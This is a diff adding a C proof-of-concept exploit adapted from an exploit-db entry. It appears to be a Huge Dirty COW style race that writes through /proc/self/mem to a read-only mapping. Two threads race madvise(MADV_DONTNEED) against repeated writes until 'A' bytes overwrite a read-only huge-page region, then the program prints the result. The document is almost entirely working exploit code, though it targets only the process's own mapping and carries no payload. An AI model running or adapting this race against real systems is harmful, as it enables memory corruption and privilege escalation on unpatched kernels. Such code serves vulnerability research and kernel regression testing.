@@ -1,0 +1,91 @@
+/*
+ * The code is modified from https://www.exploit-db.com/exploits/43199/
+ */
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <sys/mman.h>
+#include <err.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+#include <sched.h>
+#include <pthread.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+
+#define TRIES_PER_PAGE (20000000)
+#define PAGE_SIZE (0x1000)
+#define MEMESET_VAL (0x41)
+#define MAP_SIZE (0x200000)
+#define STRING "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+#define OFFSIZE ((sizeof(STRING)-1)/sizeof(char))
+
+struct args{
+  int fd;
+  void *p;
+  int stop;
+  off_t off;
+  char *chp;
+};
+
+void *write_thread(struct args *arg) {
+  for (int i = 0; i < TRIES_PER_PAGE && !arg->stop; i++) {
+    lseek(arg->fd, (off_t)(arg->chp + arg->off*OFFSIZE), SEEK_SET);
+    write(arg->fd, STRING, sizeof(STRING));
+    lseek(arg->fd, (off_t)(arg->chp + arg->off*OFFSIZE), SEEK_SET);
+  }
+  return NULL;
+}
+
+void *wait_for_success(struct args *arg) {
+  while(*(arg->chp+arg->off*OFFSIZE) != 'A') {
+    int i = madvise(arg->p, MAP_SIZE, MADV_DONTNEED);
+    sched_yield();
+  }
+  arg->stop = 1;
+  return NULL;
+}
+
+int main(void) {
+  struct args arg;
+
+  arg.off = 0;
+  
+  arg.p =  mmap((void*)0x40000000, MAP_SIZE, PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+  
+  if(arg.p == MAP_FAILED)
+    perror("[!] mmap()");
+  arg.chp = arg.p;
+  printf("mmap address is %p\n", arg.p);
+  madvise(arg.p, MAP_SIZE, MADV_HUGEPAGE);
+
+  arg.fd = open("/proc/self/mem", O_RDWR);
+  if (arg.fd < 0) {
+    perror("[!] open()");
+    return 1;
+  }
+  
+  
+  while(arg.off < PAGE_SIZE/sizeof(STRING)) {
+    arg.stop = 0;
+    pthread_t thread0, thread1;
+    int ret = pthread_create(&thread0, NULL, (void *)wait_for_success, &arg);
+    ret |= pthread_create(&thread1, NULL, (void *)write_thread, &arg);
+    
+    if (ret) {
+      perror("[!] pthread_create()");
+      return 1;
+    }
+    
+    pthread_join(thread0, NULL);
+    pthread_join(thread1, NULL); 
+   
+    printf("[*] Done 0x%x String\n", arg.off);
+    arg.off++;
+  }
+  printf("[*] Overwrite a page\n");
+  printf("%s\n", arg.p);
+  return 0;
+}
